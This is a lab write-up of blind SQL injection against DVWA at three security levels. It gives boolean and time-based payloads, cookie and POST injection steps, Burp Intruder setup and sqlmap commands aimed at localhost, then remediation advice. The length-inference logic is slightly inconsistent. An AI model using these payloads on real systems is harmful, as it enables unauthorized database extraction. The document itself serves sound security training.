# Lab Write-Up: SQL Injection – Blind
**Date:** 2026-09-05  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Injection  
**OWASP Top 10:** A03:2021 – Injection  

---

## 1. Introduction

Blind SQL Injection is a type of SQL injection where the application does not return query results or error messages directly in the response. Instead, the attacker must infer database information from the application's **behavior** — either through boolean responses (page changes appearance) or time delays. This makes it significantly harder to exploit than classic UNION-based SQLi, but equally dangerous.

**Goal of this lab:** Use boolean-based and time-based blind SQL injection to extract the database version from DVWA, without any direct data output from the query.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA – SQL Injection (Blind) Module  |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser, Burp Suite, SQLMap          |
| **Network**      | Local lab (NAT/Host-Only)            |

---

## 3. Vulnerability Overview

### Types of Blind SQLi

| Type           | Method                            | Indicator         |
|----------------|-----------------------------------|-------------------|
| Boolean-based  | True/False conditions             | Page content changes |
| Time-based     | `SLEEP()` or `BENCHMARK()` calls  | Response delay     |
| Out-of-band    | DNS/HTTP callbacks                | External requests  |

**Vulnerable Code (PHP – Low Level):**
```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE user_id = '$id';";
$result = mysqli_query($db, $query);
if ($result) {
    echo "User ID exists in the database.";
} else {
    echo "User ID is MISSING from the database.";
}
```

No data is returned — only a boolean message.

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → SQL Injection (Blind). Set security to **Low**.

#### Step 1 – Confirm Normal Behavior

- Input `1` → "User ID exists in the database."
- Input `99` → "User ID is MISSING from the database."
- Input `'` → "MISSING" or error → confirms vulnerability

#### Step 2 – Boolean-Based Injection Confirm

**Always-true payload:**
```
1' AND '1'='1'#
```
→ "User ID **exists** in the database." ✅

**Always-false payload:**
```
1' AND '1'='2'#
```
→ "User ID is **MISSING** from the database." ✅

**Conclusion:** The application is vulnerable to boolean-based blind SQLi.

#### Step 3 – Extract Database Version Length

```
1' AND CHAR_LENGTH((SELECT @@version)) > 5#
```
→ Exists (true)

```
1' AND CHAR_LENGTH((SELECT @@version)) > 20#
```
→ Exists (true)

```
1' AND CHAR_LENGTH((SELECT @@version)) > 24#
```
→ Missing (false)

**Conclusion:** The version string is **24 characters** long.

#### Step 4 – Extract Version Character by Character

For each position, ask what character is there:
```
1' AND SUBSTRING((SELECT @@version), 1, 1) = '1'#
```
→ Exists → first character is `1`

```
1' AND SUBSTRING((SELECT @@version), 2, 1) = '0'#
```
→ Exists → second character is `0`

Continue until the full version string is reconstructed.

**Result:** `10.11.5-MariaDB-1:10.11.5` (example)

#### Step 5 – Automate with Burp Intruder

1. Send the payload request to Burp **Intruder**
2. Attack type: **Cluster Bomb**
3. Mark two positions:
   - `P1`: character position (1 to 24)
   - `P2`: character guess (a–z, 0–9, `.`, `-`)

4. Under **Options → Grep – Match**: add `User ID exists`

5. Run → Hits identify each correct character.

#### Step 6 – Time-Based Blind SQLi

If the app shows no difference between true/false:
```
1' AND SLEEP(5)#
```
→ 5-second delay confirms SQLi

**Extract via timing:**
```
1' AND IF((SELECT @@version) LIKE '10%', SLEEP(5), 0)#
```
→ 5-second delay → version starts with `10`

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** Input is a POST-based dropdown — no text input. `mysql_real_escape_string()` is used but query lacks quotes around the integer parameter.

#### Step 1 – Intercept with Burp Repeater

Intercept the form submission. Modify POST body:

**Original:**
```
id=1&Submit=Submit
```

**Payload (no quotes needed — integer context):**
```
id=1 AND 1=1#&Submit=Submit
```
→ Exists ✅

```
id=1 AND 1=2#&Submit=Submit
```
→ Missing ✅

#### Step 2 – Use ASCII for Comparison (No Quotes)

Since `mysql_real_escape_string()` blocks quote characters, use ASCII comparisons:

**Get first character of version:**
```
id=1 AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) = 49#&Submit=Submit
```
→ ASCII 49 = `1` → Exists ✅

**Step through each character systematically.**

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The User ID is now submitted on a **separate popup page** and stored in a **cookie** (`id` cookie), then read on the main page.

#### Step 1 – Find the Cookie

Open the popup, submit a value, and inspect cookies in browser DevTools:
- Cookie: `id=1`

#### Step 2 – Inject via Cookie

Use Burp to intercept the page load and modify the `id` cookie:

**Request:**
```
GET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc123; security=high; id=1' AND '1'='1'#
```

→ "User ID **exists** in the database." ✅

```
Cookie: ...id=1' AND '1'='2'#
```

→ "User ID is **MISSING**" ✅

**Confirmed:** High level is vulnerable via cookie injection.

#### Step 3 – Full Extraction via Cookie

Extract version length via cookie:
```
id=1' AND CHAR_LENGTH((SELECT @@version)) = 24#
```

Extract characters:
```
id=1' AND SUBSTRING((SELECT @@version), 1, 1) = '1'#
```

---

## 5. Automated Extraction with SQLMap

SQLMap can automate blind SQLi completely:

**Low level:**
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  --technique=B \
  --dbs -v 3
```

**Time-based:**
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  --technique=T \
  --dbs
```

**High level (cookie injection):**
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/" \
  --cookie="PHPSESSID=abc123; security=high; id=1" \
  -p id \
  --technique=B \
  --dbs
```

---

## 6. Findings Summary

| Security Level | Vulnerable | Technique              | Injection Point |
|----------------|------------|------------------------|-----------------|
| Low            | ✅ Yes     | Boolean + Time-based   | GET `id` param  |
| Medium         | ✅ Yes     | Boolean (ASCII)        | POST `id` param |
| High           | ✅ Yes     | Boolean                | Cookie `id`     |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.8      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: Medium |

**Business Impact:**
- Full database enumeration (slower but equally effective as UNION-based)
- Credential extraction through automated tools
- Invisible to basic WAF rules that look for UNION/SELECT in responses

---

## 8. Remediation Recommendations

| Fix                        | Description                                                        |
|----------------------------|--------------------------------------------------------------------|
| **Parameterized Queries**  | Use PDO/MySQLi with bound parameters                              |
| **Input Validation**       | Accept only integers for ID fields                                 |
| **Error Handling**         | Don't disclose whether user exists vs. wrong password              |
| **WAF**                    | Detect and block time-delay attacks (SLEEP, BENCHMARK)            |
| **Least Privilege**        | DB user should only have SELECT on necessary tables               |

**Secure Code (PHP):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
$result = $stmt->fetch();
echo $result ? "User exists" : "User not found";
```

---

## 9. References

- [PortSwigger – Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [DVWA Blind SQLi Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/blind-sqli_dvwa_walkthrough/)
- [DVWA SQLi Blind – dev-angelist](https://dev-angelist.gitbook.io/writeups-and-walkthroughs/dvwa/sqli-blind)
- [SQLMap Documentation](https://sqlmap.org/)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – SQL Injection (Blind) Module
Technique: Boolean-based blind SQLi
Payload:   1' AND SUBSTRING((SELECT @@version),1,1)='1'#
Result:    DB version reconstructed: 10.11.5-MariaDB
Automated: sqlmap --technique=B confirmed all 3 levels
Severity:  CRITICAL (CVSS 9.8)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
